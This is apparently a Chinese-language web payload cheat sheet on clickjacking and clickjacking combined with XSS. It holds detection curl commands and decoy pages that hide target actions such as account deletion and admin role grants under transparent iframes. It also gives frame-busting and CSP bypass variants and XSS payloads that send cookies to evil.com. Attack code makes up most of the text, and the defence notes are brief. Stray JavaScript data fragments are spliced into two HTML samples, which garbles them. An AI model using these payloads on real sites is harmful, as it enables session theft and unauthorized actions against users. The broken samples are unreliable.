# 点击劫持

_2 条 web payload_

### 基础点击劫持  `clickjacking-basic`
_通过透明iframe覆盖诱使用户在不知情的情况下点击隐藏的恶意按钮或链接_
子类：**基础** · tags: `clickjacking` `ui-redressing` `iframe`

**前置条件：**
- 目标站点允许被iframe嵌套
- 目标未设置X-Frame-Options响应头
- 目标未配置CSP frame-ancestors策略
- HTML/CSS基础知识

**攻击链：**

**检测X-Frame-Options和CSP**
> 检查目标是否设置了防点击劫持的安全头
_platform: linux_
```
curl -sI "http://target.com" | grep -iE "x-frame-options|content-security-policy|frame-ancestors"

# 批量检测:
for url in $(cat urls.txt); do
  echo -n "$url: "
  xfo=$(curl -sI "$url" | grep -i "x-frame-options")
  csp=$(curl -sI "$url" | grep -i "frame-ancestors")
  [ -z "$xfo" ] && [ -z "$csp" ] && echo "VULNERABLE" || echo "Protected: $xfo $csp"
done
```
**语法解析：**
- `curl -sI` — 静默模式仅获取HTTP响应头 _command_
- `grep -iE` — 不区分大小写的扩展正则匹配 _command_
- `x-frame-options` — 防止页面被iframe嵌套的安全头 _value_
- `frame-ancestors` — CSP指令，控制哪些源可以嵌套本页 _value_

**基础透明iframe覆盖POC**
> 构造诱饵页面，将目标敏感操作页面以透明iframe覆盖在诱饵按钮上方
```
<html>
<head><title>Win a Prize!</title>
<style>
  #target-frame {
    position: absolute; top: 0; left: 0;
    width: 500px; height: 500px;
    opacity: 0.0001; /* 近乎完全透明 */
    z-index: 2; border: none;
  }
  #decoy-btn {
    position: absolute; top: 120px; left: 50px;
    z-index: 1; padding: 15px 30px;
    font-size: 20px; cursor: pointer;
    background: #4CAF50; color: white;
    border: none; border-radius: 5px;
  }
</style></head>
<body>
  <h1>Congratulations! You Won!</h1>
  <p>Click the button to claim your prize:</p>
  <button id="decoy-btn">Claim Prize</button>
  <iframe id="target-frame" src="http://target.com/account/delete"></iframe>
</body></html>
```
**语法解析：**
- `opacity: 0.0001` — 设置iframe几乎完全透明，用户无法看到 _value_
- `z-index: 2` — 确保iframe层级在诱饵按钮之上 _value_
- `position: absolute` — 绝对定位使iframe和按钮可以精确重叠 _value_
- `/account/delete` — 目标站点的敏感操作URL(如删除账户、转账等) _value_

**多步骤拖拽劫持(Drag-and-Drop)**
> 利用HTML5拖拽API实现跨域数据提取型点击劫持
```
<html>
<head><style>
  #source { width:200px; height:50px; background:#eee; text-align:center; line-height:50px; }
  #target-frame { position:absolute; top:0; left:0; width:600px; height:400px; opacity:0.0001; z-index:10; }
</style>
<script>
  // 监听拖拽事件，可以跨域提取数据
  document.addEventListener("drag", function(e) {
    console.log("Dragging:", e.dataTransfer.getData("text"));
  });
</script></head>
<body>
  <div id="source" draggable="true">Drag this to win!</div>
  <div id="drop-zone" style="width:200px;height:200px;border:2px dashed #ccc;margin-top:20px;">Drop Here</div>
  <iframe id="target-frame" src="http://target.com/profile" sandbox="allow-scripts allow-forms"></iframe>
</body></html>
```
**语法解析：**
- `draggable="true"` — 使元素可被拖拽 _value_
- `dataTransfer.getData` — 从拖拽操作中提取数据 _command_
- `sandbox="allow-scripts allow-forms"` — 限制iframe权限的同时允许脚本和表单 _value_

**利用CSS pointer-events绕过**
> 使用pointer-events:none使覆盖层不拦截点击，点击直接穿透到下层iframe
```
<style>
  .overlay { pointer-events: none; position: absolute; z-index: 100; }
  iframe { pointer-events: auto; position: absolute; opacity: 0; }
</style>
<div class="overlay">
  <h1>Survey: Rate Our Service</h1>
  <p>Select your rating below:</p>
  <!-- 诱饵内容完全不拦截鼠标事件 -->
  <div style="display:flex; gap:20px; margin-top:50px;">
    <span style="font-size:40px">⭐</span>
    <span style="font-size:40px">⭐⭐</span>
    <span style="font-size:40px">⭐⭐⭐</span>
  </div>
</div>
<iframe src="http://target.com/admin/grant-role?role=admin&user=attacker" style="width:100%;height:100%;border:none;"></iframe>
```
**语法解析：**
- `pointer-events: none` — 使元素不响应鼠标事件，点击穿透到下层 _value_
- `pointer-events: auto` — iframe保持正常响应鼠标事件 _value_

**WAF/EDR 绕过变体：**

**iframe sandbox属性绕过**
> 通过iframe sandbox属性的allow-top-navigation和allow-scripts组合绕过部分frame-busting脚本
```
<iframe src="https://target.com" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>

<!-- 利用sandbox allow-top-navigation绕过 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation allow-forms"></iframe>

<!-- 利用sandbox+srcdoc绕过 -->
<iframe srcdoc="<script>top.location='https://target.com'</script>" sandbox="allow-scripts allow-top-navigation"></iframe>
```
**语法解析：**
- `<script>` — 脚本标签 _tag_
- `<iframe>` — 内嵌框架 _tag_

**X-Frame-Options ALLOW-FROM不一致**
> X-Frame-Options ALLOW-FROM在不同浏览器中表现不一致，Chrome/Safari完全忽略此指令
```
<!-- 利用浏览器对ALLOW-FROM支持不一致 -->
<!-- Chrome/Safari忽略ALLOW-FROM，仅CSP frame-ancestors生效 -->

<!-- 双重iframe绕过frame-busting -->
<iframe src="data:text/html,<iframe src='https://target.com'></iframe>"></iframe>

<!-- 利用window.name绕过 -->
<iframe src="attacker-page.html" name="payload_data"></iframe>
```
**语法解析：**
- `<iframe>` — 内嵌框架 _tag_

**双重嵌套iframe绕过**
> 通过双重嵌套iframe使frame-busting脚本中的top引用指向中间页而非攻击页
```
<!-- 双重嵌套绕过frame-busting -->
<iframe src="middle-page.html"></iframe>

<!-- middle-page.html内容 -->
<html><body>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: '内嵌框架', en: 'Inline frame (iframe)' }, type: 'tag' }
          ]
<iframe src="https://target.com" sandbox="allow-forms"></iframe>
</body></html>

<!-- onbeforeunload阻止跳转 -->
<script>window.onbeforeunload=function(){return "x";}</script>
<iframe src="https://target.com"></iframe>
```


**概述：** 点击劫持(Clickjacking/UI Redressing)是一种视觉欺骗攻击，攻击者通过透明的iframe覆盖在诱饵页面上，诱使用户在不知情的情况下点击隐藏在iframe中的敏感操作按钮。攻击可以导致账户删除、转账、授权等危险操作。

**漏洞原理：** 目标网站未设置X-Frame-Options响应头(DENY/SAMEORIGIN)，也未配置Content-Security-Policy的frame-ancestors指令，允许任意第三方页面通过iframe嵌套加载。

**利用方法：** 利用流程：1) 检测目标是否允许iframe嵌套 2) 定位目标站点的敏感操作页面(如删除、转账、修改权限) 3) 构造诱饵页面，将目标页面以透明iframe覆盖 4) 精确对齐iframe中的目标按钮与诱饵按钮位置 5) 诱使受害者访问诱饵页面并点击

**防御措施：** 1) 设置X-Frame-Options: DENY或SAMEORIGIN 2) 配置CSP: frame-ancestors 'self' 3) 对敏感操作添加二次确认 4) 使用SameSite Cookie属性 5) JavaScript frame-busting脚本(作为兜底)

---

### 点击劫持+XSS  `clickjacking-xss`
_将点击劫持与XSS攻击结合，先通过点击劫持触发XSS攻击向量获取更深层的控制_
子类：**XSS** · tags: `clickjacking` `xss`

**前置条件：**
- 目标存在XSS漏洞
- 目标允许被iframe嵌套
- XSS payload可被点击触发

**攻击链：**

**识别可利用的XSS和Clickjacking组合**
> 同时检测目标的点击劫持和XSS漏洞
```
# 1. 检测iframe嵌套防护
curl -sI "http://target.com" | grep -i "x-frame-options|frame-ancestors"

# 2. 检测已知XSS点
curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep -i "script"

# 3. 检测Self-XSS (需要用户交互)
curl -s "http://target.com/profile/edit" -d "bio=<img+src=x+onerror=alert(document.cookie)>"
```
**语法解析：**
- `curl -sI` — 获取响应头检测安全配置 _command_
- `grep -i` — 不区分大小写搜索安全头 _command_

**Self-XSS + Clickjacking组合利用**
> 利用多步骤点击劫持触发Self-XSS——先引导用户点击编辑按钮，再诱导粘贴XSS payload
```
<html><head>
<style>
  iframe { position:absolute; top:0; left:0; width:800px; height:600px; opacity:0.0001; z-index:10; }
  .step { position:absolute; z-index:1; }
</style>
<script>
var step = 0;
function nextStep() {
  step++;
  if (step === 1) {
    // 第一步：诱导用户点击"个人资料编辑"按钮
    document.getElementById("msg").innerText = "Step 1: Click to claim reward!";
  } else if (step === 2) {
    // 第二步：诱导用户点击输入框
    document.getElementById("msg").innerText = "Step 2: Click to verify identity!";
  } else if (step === 3) {
    // 第三步：诱导粘贴(Ctrl+V)，执行XSS
    document.getElementById("msg").innerText = "Step 3: Press Ctrl+V to paste verification code!";
    navigator.clipboard.writeText('<img src=x onerror="fetch('https://evil.com/steal?'+document.cookie)">');
  }
}
</script></head>
<body onload="nextStep()">
  <h1 id="msg">Loading prize...</h1>
  <button class="step" onclick="nextStep()" style="top:200px;left:100px;">Next Step</button>
  <iframe src="http://target.com/profile/edit"></iframe>
</body></html>
```
**语法解析：**
- `navigator.clipboard.writeText` — 通过JS将恶意payload写入剪贴板 _command_
- `onload="nextStep()"` — 页面加载后自动开始攻击流程 _value_
- `opacity:0.0001` — 隐藏目标iframe _value_

**反射型XSS + iframe嵌套利用**
> 将含有XSS payload的URL通过iframe加载，利用点击劫持触发需要用户交互的XSS
```
<html><head>
<style>
  iframe { width:100%; height:100%; position:absolute; top:0; left:0; opacity:0; border:none; }
</style></head>
<body>
  <h1>Free WiFi Login</h1>
  <p>Please click "Connect" to access free WiFi</p>
  <button style="padding:15px 40px; font-size:18px; margin-top:20px;">Connect</button>
  <!-- iframe加载含XSS的URL，按钮位置精确对齐触发XSS -->
  <iframe src="http://target.com/page?callback=<script>document.location='https://evil.com/steal?c='+document.cookie</script>"></iframe>
</body></html>
```
**语法解析：**
- `callback=<script>...` — 利用反射型XSS参数注入恶意脚本 _value_
- `document.location=` — 将用户cookie外带到攻击者服务器 _command_

**WAF/EDR 绕过变体：**

**CSP frame-ancestors绕过**
> 利用data:/blob: URI和srcdoc属性绕过CSP中frame-ancestors指令对iframe内容的限制
```
<!-- 利用data: URI绕过CSP（旧浏览器） -->
<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>

<!-- blob: URI绕过 -->
<script>
var blob = new Blob(['<script>alert(1)<\/script>'], {type: 'text/html'});
document.getElementById('frame').src = URL.createObjectURL(blob);
</script>

<!-- srcdoc属性绕过 -->
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
```
**语法解析：**
- `<script>` — 脚本标签 _tag_
- `alert()` — 弹窗函数 _function_
- `<iframe>` — 内嵌框架 _tag_

**sandbox属性配置错误利用**
> 利用sandbox属性中allow-scripts与allow-same-origin组合或allow-popups-to-escape-sandbox逃逸沙箱
```
<!-- sandbox allow-scripts允许执行JS -->
<iframe src="https://target.com" sandbox="allow-scripts allow-same-origin">
</iframe>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: '内嵌框架', en: 'Inline frame (iframe)' }, type: 'tag' },
            { part: 'alert()', explanation: { zh: '弹窗函数', en: 'Alert function' }, type: 'function' }
          ]

<!-- 利用allow-popups逃逸 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox">
</iframe>

<!-- allow-top-navigation + 点击劫持 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation-by-user-activation">
</iframe>
```

**拖放劫持注入XSS**
> 通过HTML5拖放API将XSS payload从攻击页面拖入目标iframe中的可编辑区域
```
<!-- 拖放劫持将XSS payload注入目标页面 -->
<style>
#drag { position: absolute; z-index: 1; opacity: 0; }
#target { position: absolute; z-index: 0; }
</style>

<div id="drag" draggable="true"
  ondragstart="event.dataTransfer.setData('text/html','<img src=x onerror=alert(1)>')">
  Drag me
</div>

<iframe id="target" src="https://target.com/page-with-editable-field"
  sandbox="allow-scripts allow-same-origin">
</iframe>
```
**语法解析：**
- `<img>` — 图片标签 _tag_
- `onerror` — 错误事件 _keyword_
- `alert()` — 弹窗函数 _function_
- `<iframe>` — 内嵌框架 _tag_


**概述：** 点击劫持+XSS组合攻击将两种客户端漏洞结合使用。单独的Self-XSS通常影响有限(需要受害者自己在输入框中粘贴payload)，但与点击劫持结合后，攻击者可以通过多步骤引导使Self-XSS变为可远程利用的漏洞。

**漏洞原理：** 1) 目标存在Self-XSS或反射型XSS漏洞 2) 目标未设置X-Frame-Options或CSP frame-ancestors 3) 两个漏洞单独利用价值有限，但组合后危害升级

**利用方法：** 利用流程：1) 发现Self-XSS漏洞点(如个人资料编辑页) 2) 确认目标允许iframe嵌套 3) 构造多步骤点击劫持页面 4) 通过clipboard API预置XSS payload 5) 引导用户完成"点击编辑-粘贴-提交"的操作链

**防御措施：** 1) 设置X-Frame-Options: DENY 2) 修复所有XSS漏洞(包括Self-XSS) 3) 对输入内容实施严格的HTML编码 4) 配置CSP限制内联脚本执行 5) 关键操作使用CSRF Token

---
